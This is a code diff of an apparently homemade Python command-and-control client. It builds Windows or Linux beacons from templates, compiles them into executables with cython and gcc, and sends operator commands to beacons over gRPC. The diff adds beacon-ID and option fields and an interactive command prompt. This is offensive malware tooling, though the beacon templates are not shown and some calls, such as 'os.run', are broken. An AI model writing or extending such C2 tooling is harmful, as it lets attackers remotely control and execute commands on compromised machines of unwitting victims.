@@ -4,8 +4,6 @@ import sys
 import grpc
 import protobuff_pb2_grpc as pb2_grpc
 import protobuff_pb2 as pb2
-
-
 class UnaryClient(object):
     """
     Client for gRPC functionality
@@ -22,14 +20,13 @@ class UnaryClient(object):
         # bind the client and the server
         self.stub = pb2_grpc.UnaryStub(self.channel)
 
-    def get_url(self, message):
+    def get_url(self, message, beaconID, opt):
         """
         Client function to call the rpc for GetServerResponse
         """
-        message = pb2.Message(message=message)
+        message = pb2.Message(bID=beaconID, message=message, opt=opt)
         print(f'{message}')
         return self.stub.GetServerResponse(message)
-
 def BobTheBuilder():
     buildmeabeacon = input("Are we building Win or Nix? >")
 
@@ -38,8 +35,6 @@ def BobTheBuilder():
     if buildmeabeacon == "win":
         with open("out.py", 'w') as f:
             f.write(Functemplates.WINCMDEXEC + '\n' + Functemplates.BASE)
-
-
 def FarmerPickles(PyFileName):
     buildmeaexe = input("Are we building a bin or an exe? >")
 
@@ -49,7 +44,6 @@ def FarmerPickles(PyFileName):
         os.run(f"cython {PyFileName}.py --embed")
         PYTHONLIBVER = sys.version_info[:2]
         os.run(f"gcc -Os $(python3-config --includes) {PyFileName}.c -o output_bin_file $(python3-config --ldflags) -l {PYTHONLIBVER}")
-
 def SendCommand(beaconID):
     '''
     This uses gRPC to talk with the C2
@@ -60,11 +54,11 @@ def SendCommand(beaconID):
     :return: Get the result of the command
     '''
     command = input("> ")
+    opt = input("> ")
     client = UnaryClient()
-    result = client.get_url(message=command, ID=beaconID)
+    result = client.get_url(message=command, beaconID=beaconID, opt=opt)
     print(f'{result}')
 
 if __name__ == '__main__':
-    client = UnaryClient()
-    result = client.get_url(message="Hello Server you there?")
-    print(f'{result}')
+    bID = input("> ")
+    SendCommand(bID)
